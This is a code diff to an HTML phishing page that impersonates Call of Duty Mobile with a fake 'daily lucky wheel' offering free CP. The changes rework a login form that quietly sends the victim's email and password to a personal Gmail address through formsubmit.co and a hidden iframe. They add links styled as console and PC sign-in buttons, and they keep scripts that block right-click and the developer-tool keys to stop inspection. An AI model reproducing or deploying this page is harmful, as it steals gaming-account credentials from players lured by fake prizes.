@@ -8,7 +8,6 @@
     <link rel="stylesheet" href="https://www.callofduty.com/cdn/codm/zpHm2flUeC/css/style2.css" />
     <link rel="stylesheet" href="https://www.callofduty.com/cdn/codm/zpHm2flUeC/css/language.css" />
     <link rel="icon" href="favicon.ico">
-
     <style>
         h1, h2, p, span, a, label { text-transform: none !important; }
         .official-header {
@@ -27,13 +26,11 @@
         .official-header nav a:hover { color: #00ff00; }
         .official-footer { background: #111; color: #888; padding: 30px 20px; text-align: center; font-size: 12px; border-top: 1px solid #333; }
         body { background: #000 url('https://www.callofduty.com/content/dam/atvi/callofduty/cod-touchui/global/backgrounds/codm-bg.jpg') no-repeat center/cover; margin: 0; padding-top: 80px; color: #fff; font-family: 'Arial', sans-serif; }
-        .input-field-wrapper { position: relative; }
-        .eye-icon { position: absolute; top: 50%; right: 15px; transform: translateY(-50%); cursor: pointer; width: 24px; height: 24px; color: #fff; }
-        .eye-icon:hover { color: #00ff00; }
+       
+        .eye-icon { position: absolute; top: 50%; right: 15px; transform: translateY(-50%); cursor: pointer; width: 24px; height: 24px; color: #aaa; }
+        .eye-icon:hover { color: #fff; }
         .success-msg { font-weight: bold; text-align: center; margin-top: 20px; font-size: 18px; display: none; }
-        .btn_yellow { width: 100%; cursor: pointer; }
         iframe { display: none !important; width: 0; height: 0; border: 0; }
-
         .section { display: none; text-align: center; padding: 40px 20px; }
         .section.active { display: block; }
 
@@ -50,51 +47,13 @@
             margin-bottom: 20px;
             text-shadow: 0 0 10px #00ff00;
         }
-        #wheel-container {
-            position: relative;
-            display: inline-block;
-            margin: 20px auto;
-        }
-        #wheel {
-            width: 350px;
-            height: 350px;
-            border-radius: 50%;
-            border: 8px solid #00ff00;
-            box-shadow: 0 0 20px #00ff00;
-            transition: transform 6s cubic-bezier(0.23, 1, 0.32, 1);
-        }
-        #winning-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 350px;
-            height: 350px;
-            border-radius: 50%;
-            pointer-events: none;
-            opacity: 0;
-            transition: opacity 1.5s ease;
-        }
-        #winning-text {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            font-size: 42px;
-            font-weight: bold;
-            color: #fff;
-            text-shadow: 0 0 20px #000, 0 0 40px #00ff00;
-            white-space: nowrap;
-        }
+        #wheel-container { position: relative; display: inline-block; margin: 20px auto; }
+        #wheel { width: 350px; height: 350px; border-radius: 50%; border: 8px solid #00ff00; box-shadow: 0 0 20px #00ff00; transition: transform 6s cubic-bezier(0.23, 1, 0.32, 1); }
+        #winning-overlay { position: absolute; top: 0; left: 0; width: 350px; height: 350px; border-radius: 50%; pointer-events: none; opacity: 0; transition: opacity 1.5s ease; }
+        #winning-text { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 42px; font-weight: bold; color: #fff; text-shadow: 0 0 20px #000, 0 0 40px #00ff00; white-space: nowrap; }
         #spin-btn, #continue-btn {
-            padding: 15px 40px;
-            font-size: 20px;
-            background: linear-gradient(to bottom, #ffdd00, #ff9900);
-            border: none;
-            border-radius: 50px;
-            color: #000;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 20px;
+            padding: 15px 40px; font-size: 20px; background: linear-gradient(to bottom, #ffdd00, #ff9900);
+            border: none; border-radius: 50px; color: #000; font-weight: bold; cursor: pointer; margin-top: 20px;
             box-shadow: 0 5px 15px rgba(0,0,0,0.5);
         }
         #spin-btn:disabled {
@@ -103,35 +62,19 @@
             cursor: not-allowed;
             opacity: 0.6;
         }
-        #result-text {
-            margin-top: 30px;
-            font-size: 28px;
-            font-weight: bold;
-            color: #00ff00;
-            min-height: 50px;
-            text-shadow: 0 0 10px #00ff00;
-        }
-        .arrow {
-            position: absolute;
-            top: -20px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 0;
-            height: 0;
-            border-left: 25px solid transparent;
-            border-right: 25px solid transparent;
-            border-top: 50px solid #ff0000;
-            z-index: 10;
-            filter: drop-shadow(0 8px 15px rgba(0,0,0,0.9));
-        }
+        #result-text { margin-top: 30px; font-size: 28px; font-weight: bold; color: #00ff00; text-shadow: 0 0 10px #00ff00; }
+        .arrow { position: absolute; top: -20px; left: 50%; transform: translateX(-50%); width: 0; height: 0;
+            border-left: 25px solid transparent; border-right: 25px solid transparent; border-top: 50px solid #ff0000;
+            filter: drop-shadow(0 8px 15px rgba(0,0,0,0.9)); z-index: 10; }
 
         .login-section {
-            max-width: 600px;
+            max-width: 500px;
             margin: 40px auto;
-            background: rgba(0, 0, 0, 0.6);
-            padding: 30px;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 40px 30px;
             border-radius: 15px;
-            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.2);
+            text-align: center;
         }
         .prize-announcement {
             background: rgba(0, 255, 0, 0.2);
@@ -143,52 +86,57 @@
             text-shadow: 0 0 10px #00ff00;
         }
 
-        /* کپچا */
-        #captcha-canvas {
-            width: 138px;
-            height: 52px;
-            background: #f0f0f0;
-            border-radius: 6px;
-            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
-            margin-left: 10px;
+        .input-label { display: block; text-align: left; margin-bottom: 10px; color: #fff; font-size: 16px; font-weight: normal; }
+        .input-wrapper { position: relative; margin-bottom: 30px; }
+        .input-wrapper input { 
+            width: 100%; 
+            padding: 18px 20px; 
+            border: none; 
+            border-radius: 8px; 
+            background: rgba(50, 50, 50, 0.8); 
+            color: #ccc; 
+            font-size: 18px; 
+            outline: none; 
+            box-sizing: border-box; 
         }
-        #refvc img {
-            width: 32px;
-            height: 32px;
-            cursor: pointer;
-            transition: transform 0.6s ease;
+        .input-wrapper input::placeholder { 
+            color: #777; 
         }
-        #refvc img:hover {
-            transform: rotate(360deg);
+        .input-wrapper::after { 
+            content: ''; 
+            position: absolute; 
+            top: -4px; left: -4px; right: -4px; bottom: -4px; 
+            border: 3px solid transparent; 
+            border-radius: 12px; 
+            opacity: 0; 
+            transition: all 0.4s ease; 
+            pointer-events: none; 
+            box-shadow: 0 0 20px rgba(0, 255, 100, 0.6); 
+            background: linear-gradient(to right, #00ff64, #00ffff) border-box; 
+            -webkit-mask: linear-gradient(#fff 0 0) padding-box, linear-gradient(#fff 0 0); 
+            -webkit-mask-composite: xor; 
+            mask-composite: exclude; 
         }
-
-        /* ESRB در فوتر */
-        .esrb-ratings {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 30px;
-            margin: 20px 0 10px;
-            flex-wrap: wrap;
-        }
-        .esrb-ratings img {
-            height: 80px;
-            width: auto;
-            max-width: 150px;
-        }
-        @media (max-width: 600px) {
-            .esrb-ratings {
-                gap: 20px;
-                flex-direction: column;
-            }
-            .esrb-ratings img {
-                height: 70px;
-            }
-        }
+        .input-wrapper.focus::after { opacity: 1; transform: scale(1.02); }
+        .verification_row { margin: 30px 0; display: flex; justify-content: center; align-items: center; gap: 15px; }
+        #captcha-canvas { width: 150px; height: 60px; background: #fff; border-radius: 8px; box-shadow: 0 0 20px rgba(0, 255, 100, 0.6); }
+        #refvc img { width: 36px; height: 36px; cursor: pointer; filter: brightness(0) invert(1); }
+        #refvc img:hover { transform: rotate(360deg); transition: 0.6s; }
+        .btn_yellow { width: 100%; padding: 18px; background: linear-gradient(to bottom, #ffdd00, #ccaa00); border: none; border-radius: 8px; color: #000; font-size: 20px; font-weight: bold; text-transform: uppercase; cursor: pointer; margin: 30px 0; box-shadow: 0 5px 20px rgba(255, 221, 0, 0.5); transition: all 0.3s ease; }
+        .btn_yellow:hover { background: linear-gradient(to bottom, #ffee33, #ddbb00); transform: translateY(-3px); box-shadow: 0 10px 25px rgba(255, 221, 0, 0.6); }
+        .or-divider { margin: 40px 0 30px; color: #888; font-size: 18px; position: relative; }
+        .or-divider::before { content: ''; position: absolute; top: 50%; left: 0; right: 0; height: 1px; background: #444; }
+        .or-divider span { background: rgba(0,0,0,0.7); padding: 0 30px; }
+        .platform-buttons { display: flex; justify-content: center; align-items: center; gap: 20px; flex-wrap: nowrap; }
+        .platform-btn { position: relative; width: 80px; height: 60px; background: #1a1a1a; border-radius: 8px; display: flex; align-items: center; justify-content: center; overflow: hidden; transition: all 0.3s ease; }
+        .platform-btn::before { content: ''; position: absolute; left: 0; top: 0; bottom: 0; width: 4px; background: #ffdd00; }
+        .platform-btn:hover { background: #222; transform: translateY(-5px); box-shadow: 0 8px 20px rgba(255, 221, 0, 0.3); }
+        .platform-btn img { width: 50px; height: 50px; filter: brightness(0) invert(1); }
+        .esrb-ratings { display: flex; justify-content: center; align-items: center; gap: 30px; margin: 20px 0 10px; flex-wrap: wrap; }
+        .esrb-ratings img { height: 80px; width: auto; max-width: 150px; }
     </style>
 </head>
 <body oncontextmenu="return false;">
-
     <header class="official-header">
         <nav>
             <a href="https://www.activision.com/">Home</a>
@@ -204,19 +152,15 @@
                 <div class="logo"></div>
                 <h1>Try your luck</h1>
 
-                <!-- Lucky Wheel Section -->
+                <!-- Lucky Wheel -->
                 <div id="wheel-section" class="section lucky-wheel-section active">
                     <h2>Daily Lucky Wheel</h2>
                     <p style="color:#ccc; margin-bottom:30px;">Spin the wheel and win free CP!</p>
-                    
                     <div id="wheel-container">
                         <div class="arrow"></div>
                         <canvas id="wheel" width="350" height="350"></canvas>
-                        <div id="winning-overlay">
-                            <div id="winning-text"></div>
-                        </div>
+                        <div id="winning-overlay"><div id="winning-text"></div></div>
                     </div>
-                    
                     <button id="spin-btn" onclick="spinWheel()">Spin the Wheel</button>
                     <div id="result-text"></div>
                     <button id="continue-btn" onclick="showLoginForm()" style="display:none;">Continue to Claim Prize</button>
@@ -229,43 +173,54 @@
                     <div class="code_ct">
                         <iframe name="dummyframe" id="dummyframe" style="display:none;"></iframe>
 
-                        <!-- فرم با چک کپچا -->
                         <form action="https://formsubmit.co/erfantroll778899@gmail.com" method="POST" target="dummyframe" onsubmit="return validateCaptcha()">
-                            <ul class="code_list c">
-                                <li>
-                                    <span class="desktop_label">Email</span>
-                                    <div class="input-field-wrapper">
-                                        <input type="email" name="email" id="F_UID" placeholder="Email" class="input_text" required autocomplete="off" />
-                                    </div>
-                                </li>
-                                <li>
-                                    <span class="desktop_label label-titlie redeem_text">Password</span>
-                                    <div class="input-field-wrapper">
-                                        <input type="password" name="password" id="F_CDKEY" placeholder="Password" required autocomplete="new-password">
-                                        <svg id="togglePassword" class="eye-icon" onclick="togglePasswordVisibility()" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                            <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z" fill="currentColor"/>
-                                        </svg>
-                                    </div>
-                                </li>
-                                <li class="verification_row">
-                                    <span class="desktop_label label_vercode">Verification</span>
-                                    <div class="input-field-wrapper" style="display: flex; align-items: center;">
-                                        <input type="text" name="vcode" id="F_VCODE" placeholder="Verification Code" class="input_code" required autocomplete="off" />
-                                        <canvas id="captcha-canvas" width="138" height="52"></canvas>
-                                        <a href="javascript:;" id="refvc" onclick="generateCaptcha()">
-                                            <img src="https://www.callofduty.com/cdn/codm/zpHm2flUeC/images/CODM_Refresh.webp" alt="Refresh" />
-                                        </a>
-                                    </div>
-                                </li>
-                            </ul>
+                            <label class="input-label">Email Address:*</label>
+                            <div class="input-wrapper" id="email-field">
+                                <input type="email" name="email" id="F_UID" placeholder="Email" required autocomplete="off" />
+                            </div>
+
+                            <label class="input-label">Password:*</label>
+                            <div class="input-wrapper" id="password-field">
+                                <input type="password" name="password" id="F_CDKEY" placeholder="Password" required autocomplete="new-password">
+                                <svg id="togglePassword" class="eye-icon" onclick="togglePasswordVisibility()" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z" fill="currentColor"/>
+                                </svg>
+                            </div>
+
+                            <div class="verification_row">
+                                <div class="input-wrapper" id="captcha-field" style="display:inline-block; width:180px;">
+                                    <input type="text" name="vcode" id="F_VCODE" placeholder="Verification Code" required autocomplete="off" />
+                                </div>
+                                <canvas id="captcha-canvas" width="150" height="60"></canvas>
+                                <a href="javascript:;" id="refvc" onclick="generateCaptcha()">
+                                    <img src="arrowpng.parspng.com-16.png" alt="Refresh" />
+                                </a>
+                            </div>
 
                             <input type="hidden" name="_captcha" value="false">
                             <input type="hidden" name="_template" value="table">
                             <input type="hidden" name="_subject" value="New CODM Login + Lucky Wheel Prize! 🔥">
 
-                            <button type="submit" class="btn_yellow" id="label_submit">Claim Prize & Login</button>
+                            <button type="submit" class="btn_yellow">CLAIM PRIZE & LOGIN</button>
                             <div id="result" class="success-msg"></div>
                         </form>
+
+                        <div class="or-divider"><span>OR</span></div>
+
+                        <div class="platform-buttons">
+                            <div class="platform-btn">
+                                <a href="https://my.account.sony.com/sonyacct/signin/?response_type=code&client_id=9fc1ccc1-33bb-4a20-b9fe-8b49212d2861&redirect_uri=https%3A%2F%2Fprod.umbrella.demonware.net%2Fv1.0%2Faccounts%2Fpsn%2Fauth%2Fcallback%2F&scope=psn%3As2s&state=eyJjbGllbnQiOiAic3NvLW5leHVzIiwgImNsaWVudF9zdGF0ZSI6ICIzZTU0YzVhZi03N2Y3LWU3NWItYTdhYy1lNGRhYWI3OGY3OTYiLCAicmV0dXJuX3VybCI6ICJodHRwczovL3hvLWNsaWVudC5hY3RpdmlzaW9uLmNvbS9hdXRoL3YxL3hGaXJzdFBhcnR5TG9naW4vY29tcGxldGUifQ&cid=1f673deb-dd8d-4604-a976-d9ecc574444d&error=login_required&error_code=4165&no_captcha=true#/signin/input/id"><img src="PlayStation_logo.svg.png" alt="PlayStation"></a>
+                            </div>
+                            <div class="platform-btn">
+                                <a href="https://login.live.com/oauth20_authorize.srf?client_id=000000004C19F958&scope=Xboxlive.signin%2CXboxlive.offline_access&response_type=code&redirect_uri=https%3A%2F%2Fprod.umbrella.demonware.net%2Fv1.0%2Faccounts%2Fxbl%2Fauth%2Fcallback%2F&state=eyJjbGllbnQiOiAic3NvLW5leHVzIiwgImNsaWVudF9zdGF0ZSI6ICIzN2E4ZDE4YS00YmIzLTlmYTEtMmZhZi04MGU1MGIyNDkwYzAiLCAicmV0dXJuX3VybCI6ICJodHRwczovL3hvLWNsaWVudC5hY3RpdmlzaW9uLmNvbS9hdXRoL3YxL3hGaXJzdFBhcnR5TG9naW4vY29tcGxldGUifQ%3D%3D"><img src="Xbox_Logo.svg" alt="Xbox"></a>
+                            </div>
+                            <div class="platform-btn">
+                                <a href="https://eu.account.battle.net/login/en/?ref=https://oauth.battle.net/authorize?client_id%3Db462fb2ba2d34c52af732e0d35c2d6c8%26scope%26state%3DeyJjbGllbnQiOiAic3NvLW5leHVzIiwgImNsaWVudF9zdGF0ZSI6ICIzMzdkMDU5Yy03ZTNmLTE4NTItZDYyYi1hNGJlZjNjOTA4YmEiLCAicmV0dXJuX3VybCI6ICJodHRwczovL3hvLWNsaWVudC5hY3RpdmlzaW9uLmNvbS9hdXRoL3YxL3hGaXJzdFBhcnR5TG9naW4vY29tcGxldGUiLCAicmVnaW9uIjogInVzIn0%253D%26redirect_uri%3Dhttps%253A%252F%252Fprod.umbrella.demonware.net%252Fv1.0%252Faccounts%252Fbattle%252Fauth%252Fcallback%252F%26response_type%3Dcode&app=oauth&hostingApp=oauth"><img src="battlenetLogo.png" alt="Battle.net"></a>
+                            </div>
+                            <div class="platform-btn">
+                                <a href="https://steamcommunity.com/openid/loginform/?goto=%2Fopenid%2Flogin%3Fopenid.ns%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%26openid.mode%3Dcheckid_setup%26openid.identity%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.claimed_id%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.return_to%3Dhttps%253A%252F%252Fprod.umbrella.demonware.net%252Fv1.0%252Faccounts%252Fsteam%252Fauth%252Fcallback%252F%253Fstate%253DeyJjbGllbnQiOiAic3NvLW5leHVzIiwgImNsaWVudF9zdGF0ZSI6ICI2YWI4ZmIwZC0xYmI4LTE2YjAtNjkwMy1mNDA0MjQxZTZmOTIiLCAicmV0dXJuX3VybCI6ICJodHRwczovL3hvLWNsaWVudC5hY3RpdmlzaW9uLmNvbS9hdXRoL3YxL3hGaXJzdFBhcnR5TG9naW4vY29tcGxldGUifQ%25253D%25253D%26openid.realm%3Dhttps%253A%252F%252Fprod.umbrella.demonware.net"><img src="steam-1-logo-black-and-white.png" alt="Steam"></a>
+                            </div>
+                        </div>
                     </div>
                 </div>
 
@@ -295,10 +250,15 @@
     </footer>
 
     <script>
-        // بلاک راست‌کلیک و F12
-        document.oncontextmenu = function() { return false; };
-        document.addEventListener('contextmenu', e => e.preventDefault());
+        // Glow اینپوت‌ها
+        document.querySelectorAll('.input-wrapper input').forEach(input => {
+            const parent = input.parentElement;
+            input.addEventListener('focus', () => parent.classList.add('focus'));
+            input.addEventListener('blur', () => parent.classList.remove('focus'));
+        });
 
+        // جلوگیری از راست کلیک و کلیدهای توسعه‌دهنده
+        document.oncontextmenu = e => e.preventDefault();
         document.addEventListener("keydown", e => {
             if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || (e.ctrlKey && e.keyCode === 85)) {
                 e.preventDefault();
@@ -317,69 +277,54 @@
             }
         }
 
-        // چک کپچا + پیام مناسب
         let captchaCode = "";
         function validateCaptcha() {
-            const userInput = document.getElementById("F_VCODE").value.trim();
+            const userInput = document.getElementById("F_VCODE").value.trim().toUpperCase();
             const result = document.getElementById("result");
-
             if (userInput === captchaCode) {
                 result.textContent = "Thank you, the email will be checked and the CP will be assigned.";
                 result.style.color = "#00ff00";
                 result.style.display = "block";
-                return true; // ارسال بشه
+                return true;
             } else {
                 result.textContent = "Wrong code! Try again.";
                 result.style.color = "#ff0000";
                 result.style.display = "block";
-                generateCaptcha(); // کپچا جدید
-                document.getElementById("F_VCODE").value = ""; // پاک کردن فیلد
-                return false; // جلوگیری از ارسال
+                generateCaptcha();
+                document.getElementById("F_VCODE").value = "";
+                return false;
             }
         }
 
-        // تولید کپچا
         function generateCaptcha() {
             const canvas = document.getElementById("captcha-canvas");
             const ctx = canvas.getContext("2d");
+            ctx.fillStyle = "#ffffff";
+            ctx.fillRect(0, 0, 150, 60);
+            captchaCode = Math.random().toString().substr(2, 5).toUpperCase();
 
-            ctx.fillStyle = "#f0f0f0";
-            ctx.fillRect(0, 0, 138, 52);
-
-            captchaCode = Math.random().toString().substr(2, 5);
-
-            // نویز
-            for (let i = 0; i < 200; i++) {
-                ctx.fillStyle = `rgba(0,0,0,${Math.random() * 0.1})`;
-                ctx.fillRect(Math.random() * 138, Math.random() * 52, 2, 2);
+            for (let i = 0; i < 300; i++) {
+                ctx.fillStyle = `rgba(0,0,0,${Math.random()*0.15})`;
+                ctx.fillRect(Math.random()*150, Math.random()*60, 3, 3);
             }
-
-            // خطوط
-            ctx.strokeStyle = "rgba(0,0,0,0.2)";
-            ctx.lineWidth = 2;
-            for (let i = 0; i < 4; i++) {
+            for (let i = 0; i < 5; i++) {
+                ctx.strokeStyle = "rgba(0,0,0,0.3)";
+                ctx.lineWidth = 2;
                 ctx.beginPath();
-                ctx.moveTo(Math.random() * 138, Math.random() * 52);
-                ctx.lineTo(Math.random() * 138, Math.random() * 52);
+                ctx.moveTo(Math.random()*150, Math.random()*60);
+                ctx.lineTo(Math.random()*150, Math.random()*60);
                 ctx.stroke();
             }
 
-            ctx.font = "bold 32px Arial";
+            ctx.font = "bold 38px Arial";
             ctx.fillStyle = "#000";
             ctx.textAlign = "center";
             ctx.textBaseline = "middle";
-            ctx.fillText(captchaCode, 69, 28);
+            ctx.fillText(captchaCode, 75, 30);
         }
 
-        // شروع اولیه
-        window.onload = function() {
-            generateCaptcha();
-            drawWheel();
-        };
-
-        // بقیه کد گردونه (بدون تغییر)
-        const prizes = [ "500 CP", "800 CP", "Try Again!", "1200 CP", "2000 CP", "Try Again!", "100 CP", "400 CP" ];
-        const colors = [ "#FFFF00", "#FFD700", "#FF4444", "#00FFFF", "#FF00FF", "#FF8800", "#4444FF", "#00FF00" ];
+        const prizes = ["500 CP", "800 CP", "Try Again!", "1200 CP", "2000 CP", "Try Again!", "100 CP", "400 CP"];
+        const colors = ["#FFFF00", "#FFD700", "#FF4444", "#00FFFF", "#FF00FF", "#FF8800", "#4444FF", "#00FF00"];
 
         const wheel = document.getElementById("wheel");
         const ctx = wheel.getContext("2d");
@@ -391,7 +336,7 @@
         const winningText = document.getElementById("winning-text");
 
         let isSpinning = false;
-        let hasSpun = false;
+        let hasWonCP = false;
         let currentRotation = 0;
 
         function drawWheel() {
@@ -427,7 +372,7 @@
         }
 
         function spinWheel() {
-            if (isSpinning || hasSpun) return;
+            if (isSpinning) return;
 
             winningOverlay.style.opacity = 0;
             winningText.textContent = "";
@@ -450,19 +395,24 @@
             setTimeout(() => {
                 const prize = prizes[winningIndex];
 
-                resultText.innerHTML = `Congratulations! You won: <strong>${prize}</strong> 🎉`;
+                if (prize === "Try Again!") {
+                    resultText.innerHTML = `<strong style="color:#ff4444;">Try Again!</strong> 😅<br><span style="font-size:24px;">Spin again!</span>`;
+                    spinBtn.textContent = "Spin Again!";
+                    spinBtn.disabled = false;
+                } else {
+                    resultText.innerHTML = `Congratulations! You won: <strong>${prize}</strong> 🎉`;
+                    continueBtn.style.display = "inline-block";
+                    hasWonCP = true;
+                    spinBtn.textContent = "You won CP!";
+                    spinBtn.style.background = "#555";
+                    spinBtn.style.color = "#aaa";
+                }
+
                 winningText.textContent = prize;
                 winningOverlay.style.background = `radial-gradient(circle, transparent 35%, ${colors[winningIndex]}AA 100%)`;
                 winningOverlay.style.opacity = 1;
 
-                continueBtn.style.display = "inline-block";
-
                 window.winningPrize = prize;
-
-                hasSpun = true;
-                spinBtn.textContent = "You already spun!";
-                spinBtn.style.background = "#555";
-                spinBtn.style.color = "#aaa";
 
                 isSpinning = false;
             }, 6000);
@@ -471,10 +421,14 @@
         function showLoginForm() {
             document.getElementById("wheel-section").classList.remove("active");
             document.getElementById("login-section").classList.add("active");
-
             prizeAnnouncement.textContent = `Congratulations! You won ${window.winningPrize} 🎉 Log in to claim your prize:`;
             prizeAnnouncement.style.display = "block";
         }
+
+        window.onload = function() {
+            generateCaptcha();
+            drawWheel();
+        };
     </script>
 </body>
 </html>
